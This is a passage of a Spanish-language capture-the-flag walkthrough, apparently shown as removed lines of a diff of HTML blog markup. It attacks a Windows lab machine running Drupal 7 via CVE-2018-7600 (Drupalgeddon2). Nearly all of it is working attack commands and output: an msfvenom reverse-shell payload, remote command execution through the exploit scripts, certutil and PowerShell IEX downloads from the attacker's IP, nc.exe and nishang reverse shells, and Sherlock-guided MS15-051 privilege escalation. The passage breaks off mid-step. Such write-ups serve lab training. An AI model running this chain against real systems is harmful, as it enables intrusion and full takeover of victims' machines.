-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;CVE-2018-7600/
-python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;=============================================================================&lt;/span&gt;
-|          DRUPAL 7 &amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 7.57 REMOTE CODE EXECUTION &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CVE-2018-7600&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;           |
-|                              by pimps                                     |
-&lt;span class=&quot;o&quot;&gt;=============================================================================&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Poisoning a form and including it &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;cache.
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Poisoned form ID: form-Bq2RKgVRi6UOsNDdQTbbkdP7-_788S3t3WDJh9J9rX4
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Triggering exploit to execute: &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reverse-shell-msfvenom&quot;&gt;REVERSE SHELL MSFVENOM&lt;/h2&gt;
-
-&lt;p&gt;Generamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload&lt;/code&gt; de intrusión con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; para obtener acceso a una sesión interactiva de la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.13 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4564 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; exe &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; reverseShell.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a realizar dos maneras de darle utilidad al payload generado anteriormente.&lt;/p&gt;
-
-&lt;h3 id=&quot;carga-de-reverse-por-drupageddon2--certutil&quot;&gt;CARGA DE REVERSE POR DRUPAGEDDON2 + CERTUTIL&lt;/h3&gt;
-
-&lt;p&gt;Activamos un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Hacemos uso del primer exploit para ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil.exe&lt;/code&gt; directamente en la máquina víctima, descargando la reverse shell y posteriormente se ejecuta en la ubicación asignada, no sin antes ponernos en escucha por el puerto donde generamos la reverse shell.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drupalgeddon2&amp;gt;&amp;gt; certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.13/reverseShell.exe C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;everseShell.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drupalgeddon2&amp;gt;&amp;gt; C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;everseShell.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;carga-de-reverse-por-cve-2018-7600--impacket-smbserver&quot;&gt;CARGA DE REVERSE POR CVE-2018-7600 + IMPACKET-SMBSERVER&lt;/h3&gt;
-
-&lt;p&gt;Vamos a cargar la reverse shell esta vez ejecutando comandos de manera remota por el segundo exploit y compartiendo un servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; desde nuestro equipo de atacantes, de igual forma, nos ponemos en escucha por el puerto indicado y ejecutamos directamente la reverse shell desde nuestra propia máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.13&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mbFolder&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ev.exe&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;drupalgeddon2--impacket-smbserver--nc&quot;&gt;DRUPALGEDDON2 + IMPACKET-SMBSERVER + NC&lt;/h2&gt;
-
-&lt;p&gt;En esta ocasión vamos a realizar la intrusión por medio de la ejecución remota de comandos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drupalgeddon2&lt;/code&gt;, junto con un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; activo para obtener una reverse shell por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt;, por lo que debemos tener la utilidad donde tenemos activos los recursos compartidos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/sqlninja/apps/nc.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruby 44449.rb http://10.10.10.9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;drupalgeddon2&amp;gt;&amp;gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.2&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; cmd.exe 10.10.14.2 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;carga-de-reverse-por-cve-2018-7600--impacket-smbserver-1&quot;&gt;CARGA DE REVERSE POR CVE-2018-7600 + IMPACKET-SMBSERVER&lt;/h2&gt;
-
-&lt;p&gt;Para este escenario hacemos la carga por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; y ejecución de la reverse shell generada con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; por medio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;drupa7-CVE-2018-7600.py&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;10.10.14.13&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;mbFolder&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ev.exe&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;cve-2018-7600--http-server--certutil&quot;&gt;CVE-2018-7600 + HTTP SERVER + CERTUTIL&lt;/h2&gt;
-
-&lt;p&gt;Vamos en esta oportunidad a crear una carpeta llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;intrution&lt;/code&gt;, donde vamos a hacer la descarga con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil&lt;/code&gt; la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; y luego de esto obtener una reverse shell po ejecución remota de comandos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mkdir C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ntrution&quot;&lt;/span&gt;
-python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'certutil.exe -f -urlcache -split http://10.10.14.2/nc.exe C:\\Windows\Temp\intrution\nc.exe'&lt;/span&gt;
-python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;emp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ntrution&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe -e cmd.exe 10.10.14.2 4564&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;intrusion-nishang--powershell&quot;&gt;INTRUSION NISHANG + POWERSHELL&lt;/h2&gt;
-
-&lt;p&gt;Hacemos ahora uso de &lt;a href=&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;nishang&lt;/a&gt;, realizando un ajuste en el código para obtener directamente una revese shell descargada en la máquina víctima, haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powershell&lt;/code&gt; por ejecución remota de comandos, por medio de un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; de python en nuestra máquina atacante.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
-&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;Invoke-PowerShellTcp.ps1 ps.ps1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim ps.ps1
-&lt;span class=&quot;c&quot;&gt;#AGREGAR EN LA ULTIMA LINEA&lt;/span&gt;
-Invoke-PowerShellTcp &lt;span class=&quot;nt&quot;&gt;-Reverse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-IPAddress&lt;/span&gt; 10.10.14.13 &lt;span class=&quot;nt&quot;&gt;-Port&lt;/span&gt; 4565     
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4565
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 drupa7-CVE-2018-7600.py http://10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.13/ps.ps1')&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h2&gt;
-
-&lt;p&gt;Ahora que nos encontramos dentro de la máquina víctima, vamos a realizar un método mínimamente ruidoso para la explotación de vulnerabilidades con exploits públicos, por lo que vamos a hacer uso de la utilidad &lt;a href=&quot;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&quot;&gt;Sherlock&lt;/a&gt; del github de &lt;a href=&quot;https://github.com/rasta-mouse&quot;&gt;rasta-mouse&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Modificar parámetro en el script&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim Sherlock.ps1
-&lt;span class=&quot;c&quot;&gt;#AGREGAR EN LA ULTIMA LINEA&lt;/span&gt;
-Find-AllVulns
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; de python&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En la máquina víctima ejecutamos&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.downloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.14.13/Sherlock.ps1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Resultados de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sherlock&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Title      : Task Scheduler .XML
-MSBulletin : MS10-092
-CVEID      : 2010-3338, 2010-3888
-Link       : https://www.exploit-db.com/exploits/19930/
-VulnStatus : Appears Vulnerable
-
-Title      : ClientCopyImage Win32k
-MSBulletin : MS15-051
-CVEID      : 2015-1701, 2015-2433
-Link       : https://www.exploit-db.com/exploits/37367/
-VulnStatus : Appears Vulnerable
-
-Title      : Secondary Logon Handle
-MSBulletin : MS16-032
-CVEID      : 2016-0099
-Link       : https://www.exploit-db.com/exploits/39719/
-VulnStatus : Appears Vulnerable
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada-por-ms15-051&quot;&gt;ESCALADA POR MS15-051&lt;/h2&gt;
-
-&lt;p&gt;Vamos a aprovecharnos de la vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms15-051&lt;/code&gt;, descargando y descomprimiendo el script de &lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip&quot;&gt;SecWiki&lt;/a&gt; y copiando la reverse shell generada por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom&lt;/code&gt; anteriormente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip
-unzip MS15-051-KB3045171.zip
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;MS15-051-KB3045171/
-&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ../rev.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Compartimos un servidor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Generamos un listener&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos comandos en la máquina víctima.&lt;/p&gt;
-
